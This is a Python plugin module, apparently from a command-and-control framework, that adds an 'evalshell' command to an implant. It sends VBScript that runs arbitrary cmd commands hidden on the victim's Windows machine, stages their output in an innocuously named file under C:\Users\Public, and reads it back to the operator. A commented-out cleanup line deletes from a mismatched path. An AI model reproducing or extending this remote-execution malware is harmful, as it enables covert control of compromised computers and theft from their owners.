from features import addFeature
import messages
from messages import OutgoingMessage

class EvalShellCommand():
  command = 'evalshell'

  def run(arguments, implant):
    if not implant:
      print('use implant first!')
    else:
      s = r'CreateObject("Wscript.Shell").Run("cmd /c ' + ' '.join(arguments) + r' > C:\Users\Public\cache0.dat 2>&1", 0, True)'

      m1 = OutgoingMessage('eval', bytes(s, 'ascii'))
      m2 = OutgoingMessage('eval', bytes(r'CreateObject("Scripting.FileSystemObject").OpenTextFile("C:\Users\Public\cache0.dat", 1).ReadAll()', 'ascii'))
      m3 = OutgoingMessage('eval', bytes(r'CreateObject("Wscript.Shell").Run("cmd /c del C:\Users\Public\AppData\cache0.dat", 0, False)', 'ascii'))

      implant.queueOutgoingMessage(m1)
      implant.queueOutgoingMessage(m2)
      #implant.queueOutgoingMessage(m3)

  def help():
      return 'run shell commands through the eval runtime Usage: evalshell dir C:\Windows'

  def incoming(data, implant):
    try:
      data = str(data, 'utf-8') 
      print(data, end = '\n', flush=True)
    except:
      print('Received unencodable eval data from ' + implant.name + ': ' + data.hex())

addFeature(EvalShellCommand)
